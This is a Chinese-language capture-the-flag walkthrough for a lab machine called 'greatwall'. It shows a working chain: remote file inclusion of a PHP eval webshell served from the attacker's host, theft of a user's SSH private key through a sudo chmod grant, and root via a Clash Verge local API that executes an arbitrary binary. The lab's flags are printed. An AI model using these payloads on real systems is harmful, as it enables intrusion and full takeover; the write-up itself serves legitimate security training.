# **一、信息收集**

## **1.1. 主机发现**

首先，在目标网段内使用`arp-scan`工具进行主机发现，确定目标靶机的IP地址。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.131 00:0c:29:24:e9:11       VMware, Inc.
...
```

从扫描结果中，我们识别出目标主机的IP地址为 `192.168.205.131`。

## **1.2. 端口扫描**

接下来，使用`rustscan`对目标主机进行端口扫描，以发现其开放的服务。

```shell
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ rustscan -a 192.168.205.131
...
Open 192.168.205.131:22
Open 192.168.205.131:80
```

扫描结果显示，目标主机开放了两个端口：22 (SSH) 和 80 (HTTP)。

## **1.3. Web服务探查**

访问目标 `http://192.168.205.131`，发现一个Web页面，页面上有一个输入框，提示语为 "Across the Great Wall we can reach every corner in the world"。

查看页面源代码，可以发现一个GET方法提交的表单，参数名为 `page`。

```html
<body>
    ...
    <form method="GET" class="address-form">
        <input type="text" name="page" class="address-bar" placeholder="https://">
    </form>
    ...
</body>
```

# **二、漏洞利用 (获取Webshell)**

## **2.1. LFI漏洞与出站防火墙策略发现**

根据功能猜测，`page`参数可能用于包含或请求其他页面。首先尝试使用 `file://` 协议读取本地文件，构造Payload：`file:///etc/passwd`。

服务器成功返回了 `/etc/passwd` 文件的内容，证实了此处存在一个本地文件包含 (LFI) 漏洞。

在进一步利用时，我们发现了一个关键限制：当尝试从远程服务器包含文件或发起反弹shell时，请求均会失败。经过多次测试，发现**该服务器存在出站（Egress）防火墙策略**，这并非Web应用层面的功能限制，而是更底层的网络配置（例如iptables）。该策略严格限制了服务器对外发起的连接：**只允许向目标端口为 22 (SSH) 和 80 (HTTP) 的地址建立连接**。任何试图连接到其他端口（如常用的4444, 8080等）的出站流量都会被阻断。

这一发现解释了为什么无论是远程文件包含还是反弹shell，都必须将我们攻击机上的监听服务设置在 80 或 22 端口。

## **2.2. 远程文件包含Getshell**

利用LFI漏洞，并遵从目标服务器的出站防火墙策略，我们可以让目标服务器包含并执行我们自己服务器上的恶意PHP文件，从而获取Webshell。

1. **准备Webshell**: 在Kali攻击机上创建一个简单的PHP一句话木马 `ant.php`。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ cat ant.php 
   <?php eval($_POST['ant']); ?>
   ```

2. **开启HTTP服务**: 在`ant.php`所在目录，使用Python开启一个临时的HTTP服务器。**根据前一步发现的出站防火墙策略，此HTTP服务必须开启在80端口**，否则目标服务器将无法访问。

   ```shell
   ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
   └─$ sudo python3 -m http.server 80
   Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
   ```

3. **包含远程Webshell**: 在目标Web页面的输入框中，构造Payload指向我们Kali攻击机上的webshell：`http://192.168.205.128/ant.php`。

4. **连接Webshell**: 使用蚁剑 (AntSword) 连接目标，URL为 `http://192.168.205.131/`，在请求数据的 `page` 参数中填入我们的远程马地址 `http://192.168.205.128/ant.php`，连接密码为 `ant`。

成功连接后，我们获得了目标服务器的Webshell，当前用户为 `www-data`。

# **三、权限提升**

## **3.1. www-data -> wall**

在Webshell中，我们发现当前用户 `www-data` 可以通过 `sudo` 以 `wall` 用户的身份执行 `chmod` 命令。

```shell
(www-data:/var/www/html) $ sudo -l
...
User www-data may run the following commands on this host:
    (ALL : wall) NOPASSWD: /bin/chmod
```

虽然可以直接执行 `chmod`，但无法直接利用它来修改 `/bin/bash` 等系统文件的权限以直接提权。但是，我们可以利用这个权限来修改 `wall` 用户家目录的权限，从而读取其SSH私钥。

1. **修改wall家目录权限**:

   ```shell
   (www-data:/home) $ ls -la
   drwx------  4 wall wall 4096 May 11 02:41 wall
   (www-data:/home) $ sudo -u wall chmod 755 wall
   (www-data:/home) $ ls -la
   drwxr-xr-x  4 wall wall 4096 May 11 02:41 wall
   ```

2. **读取SSH私钥**: 进入 `wall` 用户的 `.ssh` 目录，修改私钥 `id_rsa` 的权限并读取其内容。

   ```shell
   (www-data:/home/wall/.ssh) $ sudo -u wall chmod 600 id_rsa
   (www-data:/home/wall/.ssh) $ cat id_rsa
   -----BEGIN OPENSSH PRIVATE KEY-----
   b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
   ...
   QMXdH6a7iy89MAAAAOd2FsbEBncmVhdHdhbGwBAgMEBQ==
   -----END OPENSSH PRIVATE KEY-----
   ```

3. **SSH登录**: 将复制的私钥保存在Kali攻击机本地（例如 `/tmp/id_rsa`），赋予 `600` 权限，然后使用该私钥以 `wall` 用户身份SSH登录目标主机。

   ```shell
   ┌──(kali㉿kali)-[/tmp]
   └─$ vim id_rsa
   ┌──(kali㉿kali)-[/tmp]
   └─$ chmod 600 id_rsa
   ┌──(kali㉿kali)-[/tmp]
   └─$ ssh wall@192.168.205.131 -i /tmp/id_rsa
   Linux greatwall 6.1.0-32-amd64 ...
   wall@greatwall:~$ id
   uid=1000(wall) gid=1000(wall) groups=1000(wall)...
   ```

成功登录后，我们获得了 `wall` 用户的交互式Shell。

## **3.2. wall -> root**

登录`wall`用户后，再次检查`sudo`权限。

```shell
wall@greatwall:~$ sudo -l
Matching Defaults entries for wall on greatwall:
    ...
User wall may run the following commands on greatwall:
    (ALL) NOPASSWD: /usr/bin/systemctl start clash-verge-service
```

发现 `wall` 用户可以无密码启动 `clash-verge-service` 服务。这与近期披露的 **Clash Verge 权限提升漏洞**特征相符。

> [!Tip]
>
> https://mp.weixin.qq.com/s/fwIPGN79kf6_VAGkJOmz7w

**漏洞原理简析**:
Clash Verge 在通过 `systemctl` 启动服务时，会监听一个本地的HTTP接口（默认为 `127.0.0.1:33211`）。攻击者可以向该接口的 `/start_clash` 路径发送一个恶意的POST请求。请求体中的 `bin_path` 参数可以指定一个本地的可执行文件路径，服务会以`root`权限执行这个文件。这就造成了一个本地权限提升漏洞。

**利用步骤**:

1. **启动漏洞服务**: 使用 `sudo` 启动服务，激活漏洞接口。

   ```shell
   wall@greatwall:~$ sudo /usr/bin/systemctl start clash-verge-service
   ```

2. **验证服务监听**: 使用 `ss` 命令确认服务已在本地 `33211` 端口监听。

   ```shell
   wall@greatwall:~$ ss -tnlp
   State      Recv-Q     Send-Q         Local Address:Port      Peer Address:Port
   ...
   LISTEN     0          128                127.0.0.1:33211          0.0.0.0:*
   ...
   ```

3. **创建提权脚本**: 在 `/tmp` 目录下创建一个脚本 `a.sh`，其功能是为 `/bin/bash` 添加SUID权限位，并赋予其执行权限。

   ```shell
   wall@greatwall:/tmp$ cat > a.sh << EOF
   #!/bin/bash
   chmod +s /bin/bash
   EOF
   wall@greatwall:/tmp$ chmod +x a.sh
   ```

4. **发送恶意请求**: 使用 `curl` 向本地 `33211` 端口的 `/start_clash` 接口发送POST请求，通过 `bin_path` 参数指定执行我们刚刚创建的 `/tmp/a.sh` 脚本。

   ```shell
   wall@greatwall:/tmp$ curl -X POST 'http://127.0.0.1:33211/start_clash' \
   -H "Content-Type: application/json" \
   -d '{"bin_path": "/tmp/a.sh", "config_dir": "", "config_file": "", "log_file": "/dev/null"}'
   
   {"code":0,"msg":"ok","data":null}
   ```

5. **获取Root Shell**: 检查 `/bin/bash` 的权限，可以看到已经添加了SUID位。此时执行 `bash -p` 即可获得一个 `euid` 为 `root` 的shell。

   ```shell
   wall@greatwall:/tmp$ ls -la /bin/bash
   -rwsr-sr-x 1 root root 1265648 Mar 30  2024 /bin/bash
   wall@greatwall:/tmp$ bash -p
   bash-5.2# id
   uid=1000(wall) gid=1000(wall) euid=0(root) egid=0(root) groups=0(root)...
   ```

6. **读取Flag**: 至此，我们已成功提权至root，可以读取所有flag。

   ```shell
   bash-5.2# cat /root/r007.7x7oZzZzZzzzz /home/wall/user.flag
   flag{b3d2a9f34869484b74db97411cf1eb3b}
   flag{b088764475fa2a0a962fb9154f41c5b6}
   ```